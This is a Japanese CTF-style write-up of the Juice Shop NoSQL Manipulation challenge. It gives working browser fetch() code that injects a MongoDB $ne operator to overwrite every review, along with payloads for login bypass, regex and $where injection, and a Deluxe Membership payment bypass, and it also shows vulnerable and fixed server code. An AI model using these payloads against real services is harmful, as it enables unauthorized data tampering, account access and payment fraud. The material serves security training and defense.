# NoSQL Manipulation ✅

**難易度:** ⭐⭐⭐⭐
**カテゴリ:** NoSQLi (NoSQL Injection)
**目標:** 全てのレビューを一括で変更する

---

## 背景知識

### NoSQLインジェクションとは

NoSQLインジェクションは、**MongoDBなどのNoSQLデータベースに対する攻撃**。SQLインジェクションと似ているが、攻撃方法が異なる。

```
┌─────────────────────────────────────────────────────────────────┐
│                  SQLインジェクション vs NoSQLインジェクション      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  【SQLインジェクション】                                          │
│  入力: ' OR 1=1--                                               │
│  SQL:  SELECT * FROM users WHERE email = '' OR 1=1--'           │
│  結果: 全ユーザーがマッチ                                         │
│                                                                 │
│  【NoSQLインジェクション】                                        │
│  入力: {"$ne": ""}                                              │
│  クエリ: { email: {"$ne": ""} }                                 │
│  結果: 全ユーザーがマッチ（空でないメールアドレスを持つ全員）        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### MongoDB の演算子

MongoDBはJSONライクなクエリ言語を使用。特殊な演算子が `$` で始まる:

| 演算子 | 意味 | SQLの同等表現 | 例 |
|--------|------|--------------|-----|
| `$eq` | 等しい | `= ` | `{ age: { $eq: 25 } }` |
| `$ne` | 等しくない | `!=` | `{ age: { $ne: 0 } }` |
| `$gt` | より大きい | `>` | `{ age: { $gt: 18 } }` |
| `$gte` | 以上 | `>=` | `{ age: { $gte: 18 } }` |
| `$lt` | より小さい | `<` | `{ price: { $lt: 100 } }` |
| `$lte` | 以下 | `<=` | `{ price: { $lte: 100 } }` |
| `$in` | 配列内に存在 | `IN` | `{ status: { $in: ["A", "B"] } }` |
| `$or` | OR条件 | `OR` | `{ $or: [{ a: 1 }, { b: 2 }] }` |
| `$regex` | 正規表現 | `LIKE` | `{ name: { $regex: /^J/ } }` |

### 日常的な例え

MongoDBの演算子を「条件フィルター」として考えてみてください:

- **通常のリクエスト**: 「ID が 123 のレビューを編集して」
- **NoSQLi**: 「ID が -1 **でない**全てのレビューを編集して」

`$ne: -1` は「-1 以外すべて」を意味する。ID -1 は存在しないので、結果的に「全部」になる。

これは図書館で「この本（ID:123）を返却して」と言う代わりに「ID -1 でない本を全部返却して」と言うようなもの。

---

## 思考プロセス

### ステップ1: アプリケーションの分析

```
「Juice Shop のレビュー機能を調べる」
    ↓
「DevToolsのNetworkタブでAPIを確認」
    ↓
「PATCH /rest/products/reviews でレビューを更新」
    ↓
「リクエストボディに { id: 123, message: "..." } を送信」
```

### ステップ2: NoSQLの兆候を発見

```
「レビュー機能は MongoDB を使っているらしい」
    ↓
「どうやって分かる？」
    ↓
「① エラーメッセージに "MongoDB" が含まれる」
「② レスポンスに "_id" フィールドがある（MongoDBの特徴）」
「③ ソースコードの分析（Juice Shop は OSS）」
```

### ステップ3: 演算子インジェクションの発想

```
「普通は id: 123 で特定のレビューを指定」
    ↓
「もし id に演算子を渡せたら？」
    ↓
「id: {"$ne": -1} → "IDが-1でないもの全て"」
    ↓
「ID -1 は存在しない → 実質「全レビュー」を指定」
```

### ステップ4: 攻撃の検証

```
「この演算子がそのまま MongoDB に渡されるか確認」
    ↓
「サーバー側で型チェックやサニタイズがなければ成功」
    ↓
「全レビューのメッセージが書き換わる！」
```

---

## 実行手順

### Step 1: ログインする

任意のユーザーでログイン（admin でなくてもOK）

### Step 2: トークンを確認

DevTools の Console で:
```javascript
localStorage.getItem('token')
// → "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
```

### Step 3: 通常のレビュー更新を確認（任意）

```javascript
// 正常なリクエスト（特定IDのレビューを更新）
await fetch('/rest/products/reviews', {
  method: 'PATCH',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: JSON.stringify({
    id: "R1dGq",  // 特定のレビューID
    message: "Good product!"
  })
}).then(r => r.json());
```

### Step 4: NoSQLインジェクションを実行

```javascript
// 攻撃: 全レビューを一括変更
await fetch('/rest/products/reviews', {
  method: 'PATCH',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: JSON.stringify({
    id: {"$ne": -1},  // ← 演算子を注入
    message: "All reviews hacked by NoSQLi!"
  })
}).then(r => r.json()).then(console.log);
```

### Step 5: 結果を確認

商品ページのレビューを見ると、全てのレビューが同じメッセージに変わっている。

---

## 攻撃フローの図解

```
┌─────────────────────────────────────────────────────────────────┐
│                     通常のリクエスト                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  クライアント                              サーバー              │
│      │                                        │                │
│      │  { id: "abc123", message: "Good!" }    │                │
│      │ ─────────────────────────────────────▶ │                │
│      │                                        │                │
│      │              MongoDB: db.reviews.update(                │
│      │                { _id: "abc123" },                       │
│      │                { $set: { message: "Good!" } }           │
│      │              )                                          │
│      │                                        │                │
│      │  1件のレビューが更新されました          │                │
│      │ ◀───────────────────────────────────── │                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                     NoSQLインジェクション                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  攻撃者                                サーバー                 │
│      │                                    │                    │
│      │  { id: {"$ne": -1}, message: "Hacked!" }                │
│      │ ─────────────────────────────────▶ │                    │
│      │                                    │                    │
│      │              MongoDB: db.reviews.update(                │
│      │                { _id: {"$ne": -1} },  ← 演算子がそのまま！
│      │                { $set: { message: "Hacked!" } }         │
│      │              )                                          │
│      │                                    │                    │
│      │  全レビューが更新されました！ 😱    │                    │
│      │ ◀───────────────────────────────── │                    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 脆弱なコードパターン

```javascript
// ❌ 脆弱なコード
app.patch('/rest/products/reviews', (req, res) => {
  const { id, message } = req.body;

  // ユーザー入力を検証せずに直接使用
  db.collection('reviews').updateOne(
    { _id: id },  // ← id が {"$ne": -1} の場合、演算子として解釈される
    { $set: { message: message } }
  );
});
```

### なぜ脆弱か

1. **型チェックがない**: `id` が文字列であることを確認していない
2. **演算子のサニタイズがない**: `$` で始まるキーをフィルタリングしていない
3. **入力をそのままDBに渡す**: ユーザー入力を信頼している

---

## 安全な実装

```javascript
// ✅ 安全なコード
app.patch('/rest/products/reviews', (req, res) => {
  const { id, message } = req.body;

  // 1. 型チェック: id が文字列であることを確認
  if (typeof id !== 'string') {
    return res.status(400).json({ error: 'Invalid id format' });
  }

  // 2. パターンチェック: 有効なIDの形式か確認
  if (!/^[a-zA-Z0-9]+$/.test(id)) {
    return res.status(400).json({ error: 'Invalid id format' });
  }

  // 3. 所有者チェック: 自分のレビューか確認
  const review = await db.collection('reviews').findOne({ _id: id });
  if (review.userId !== req.user.id) {
    return res.status(403).json({ error: 'Not authorized' });
  }

  // 4. 安全に更新
  db.collection('reviews').updateOne(
    { _id: id },
    { $set: { message: message } }
  );
});
```

### 対策のポイント

| 対策 | 説明 |
|------|------|
| **型チェック** | `id` が文字列であることを確認 |
| **パターン検証** | 有効なID形式（英数字のみ等）をチェック |
| **演算子のサニタイズ** | `$` で始まるキーを除去または拒否 |
| **所有者チェック** | 自分のリソースのみ編集可能に |
| **ODM/ORM使用** | Mongoose などを使い、スキーマで型を強制 |

---

## 他のNoSQLインジェクションパターン

### 認証バイパス

```javascript
// 脆弱なログイン処理
const user = await db.collection('users').findOne({
  email: req.body.email,
  password: req.body.password
});

// 攻撃ペイロード
{
  "email": {"$ne": ""},
  "password": {"$ne": ""}
}
// → 空でないemail AND 空でないpassword → 最初のユーザーでログイン
```

### 正規表現インジェクション

```javascript
// 脆弱な検索処理
const users = await db.collection('users').find({
  email: { $regex: req.body.search }
});

// 攻撃ペイロード
{
  "search": ".*"
}
// → 全ユーザーを取得
```

### $where インジェクション

```javascript
// 非常に危険なコード
db.collection('users').find({
  $where: `this.email == '${email}'`
});

// 攻撃ペイロード
email = "'; return true; '"
// → 全ユーザーを取得（JavaScriptコードが実行される）
```

---

## Deluxe Fraud チャレンジとの関連

同様の手法で Deluxe Membership を無料で取得:

```javascript
// Deluxe Membership 購入
await fetch('/rest/deluxe-membership', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  },
  body: JSON.stringify({
    paymentMode: {"$ne": ""}  // 支払方法のチェックをバイパス
  })
}).then(r => r.json());
```

---

## 関連チャレンジ

- [NoSQL Exfiltration](../difficulty-5-6/nosql-exfiltration.md) - データ抽出
- [Deluxe Fraud](../difficulty-3/deluxe-fraud.md) - 支払いバイパス
- [Login Admin](../difficulty-2/login-admin.md) - SQLインジェクション（比較用）

## 参考リンク

- [OWASP - NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
- [PayloadsAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [MongoDB Security Checklist](https://www.mongodb.com/docs/manual/administration/security-checklist/)
